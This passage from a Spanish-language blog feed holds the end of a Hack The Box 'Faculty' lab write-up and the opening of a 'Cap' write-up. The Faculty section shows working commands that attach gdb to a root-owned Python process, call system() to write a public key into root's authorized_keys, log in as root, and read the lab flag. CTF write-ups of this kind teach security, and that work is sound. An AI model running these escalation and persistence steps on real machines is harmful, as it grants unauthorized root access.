0x00007f5076f65d00  _dbus_user_database_get_system
0x00007f5076f66830  _dbus_error_from_system_errno
0x00007f5076ec94c0  sd_device_get_subsystem
0x00007f5076ecb8a0  sd_device_get_parent_with_subsystem_devtype
0x00007f5076ecba10  sd_device_new_from_subsystem_sysname
0x00007f5076ecdba0  sd_device_monitor_filter_add_match_subsystem_devtype
0x00007f5076ece3b0  sd_device_enumerator_get_subsystem_next
0x00007f5076ece8c0  sd_device_enumerator_add_match_subsystem
0x00007f5076ed3650  sd_device_enumerator_get_subsystem_first
0x00007f5076ed3ce0  sd_bus_default_system
0x00007f5076ee2f60  sd_bus_open_system_machine
0x00007f5076ee3180  sd_bus_open_system_remote
0x00007f5076ee34c0  sd_bus_open_system_with_description
0x00007f5076ee3640  sd_bus_open_system
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos crear un archivo utilizando esta funcion con touch, observamos que el archivo fué creado por el usuario root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; call system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;touch /tmp/filex&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Detaching after vfork from child process 7104&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; q
A debugging session is active.

    Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;process 690&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; will be detached.

Quit anyway? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y or n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Detaching from program: /usr/bin/python3.8, process &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process 690&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; detached&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
developer@faculty:~$ ls -lah /tmp
total 48K
drwxrwxrwt &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 04:14 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 04:14 ..
drwxrwxrwt  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 .ICE-unix
drwxrwxrwt  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 .Test-unix
drwxrwxrwt  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 .X11-unix
drwxrwxrwt  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 .XIM-unix
drwxrwxrwt  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 .font-unix
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root      root         &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 04:14 filex
drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-ModemManager.service-BNZLMf
drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-logind.service-9pz07g
drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-resolved.service-cxLYYg
drwx------  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 systemd-private-da257aa0bee14aeaac159613eb6b81ed-systemd-timesyncd.service-ApuWBf
drwx------  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root      root      4.0K Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:40 vmware-root_669-3980232826
developer@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell-1&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Agregamos la clave publica de developer al archivo authorized_keys de root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
developer@faculty:~/.ssh$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEMCCsdwPYjhTfb3/+x1qmfidxXNFhnEAIL9zPGZI7lSzZLzt3HLCLNnSEOzMfKT5sIHkHXC+u2YAW7Yo3hoYKgAkw0aZWhwGciRJzMan/MHLSlUrofuDoYwBVKmuJtf8Ot0cJyawi7taqTJnSYM3axL7e4yTojffrXHbO0AbVoL3ElfsQmweZcNEtnwbVGJsqkjRaoBY1JccMO9zAOmZYOT42UhEqSkZxUHLOEbzHVrO8pZL0bfrN4ssBEE/jdrHh4BWuwB37uKDe+X0i/5m1HOQfQ+wyGuIiUcE1TL10UAY/lprhlSRgeLX8yUGexY6CJEcyBwnNxZc4Z4glu1x2nZoE6NmUYn4bq4tavHCVf1qczeA9dNPgMaplXVCn/f4lkXX38pcnV2vSLfbyOxoyXMOKMXltmOkA5wvFLRXzi331H/ttFst0XEwT/THJvpAwpwwOcusNSZ2GI5tE5kWXe/mGexb0KgUuIoT/iNYo/qU9T7fUY5Okq0tdgwNtx6k&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; developer@faculty
developer@faculty:~/.ssh$ &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/home/developer/.ssh
developer@faculty:~/.ssh$ gdb -p &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt; -q
Attaching to process &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt;
Reading symbols from /usr/bin/python3.8...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;29&lt;/span&gt;  ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; call system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /home/developer/.ssh/id_rsa.pub &amp;gt; /root/.ssh/authorized_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Detaching after vfork from child process 7458&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; q
A debugging session is active.

    Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;process 690&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; will be detached.

Quit anyway? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y or n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Detaching from program: /usr/bin/python3.8, process &lt;span class=&#34;m&#34;&gt;690&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Inferior &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;process 690&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; detached&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
developer@faculty:~/.ssh$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos ingresamos como root por SSH en localhost y obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;developer@faculty:~/.ssh$ ssh root@localhost
Welcome to Ubuntu 20.04.4 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-121-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 04:24:24 CEST &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

  System load:  0.0               Processes:             &lt;span class=&#34;m&#34;&gt;238&lt;/span&gt;
  Usage of /:   74.9% of 4.67GB   Users logged in:       &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  Memory usage: 46%               IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.11.169
  Swap usage:   0%


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
root@faculty:~# whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/root
root@faculty:~# ls
check_cron.sh  root.txt  service_check.sh
root@faculty:~# cat root.txt
0bcbf940d39d911f5f5eab105fb57894
root@faculty:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/faculty/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/faculty/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>sqli</category>
            
          
            
              <category>sqlmap</category>
            
          
            
              <category>mPDF</category>
            
          
            
              <category>meta-git</category>
            
          
            
              <category>capabilities</category>
            
          
            
              <category>command injection</category>
            
          
            
              <category>gdb</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Cap</title>
        <link>https://sckull.github.io/posts/cap/</link>
        <pubDate>Sat, 02 Oct 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Oct 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/cap/</guid>
        <description>&amp;ldquo;En Cap encontramos distintas funcionalidades informativas del sistema, una de ellas permite la descarga y analisis de archivos .</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/cap/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;&amp;ldquo;En Cap encontramos distintas funcionalidades informativas del sistema, una de ellas permite la descarga y analisis de archivos .pcap, luego del analisis de un archivo encontramos credenciales que nos dieron acceso por FTP y SSH. Tras enumerar las capabilities del sistema logramos escalar privilegios por medio de Python.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/351&#34;&gt;Cap&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;os_type&#34;&gt; Linux &lt;img src=&#34;https://sckull.github.io/images/icons/linux.png&#34; class=&#34;img_type_os&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.245&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
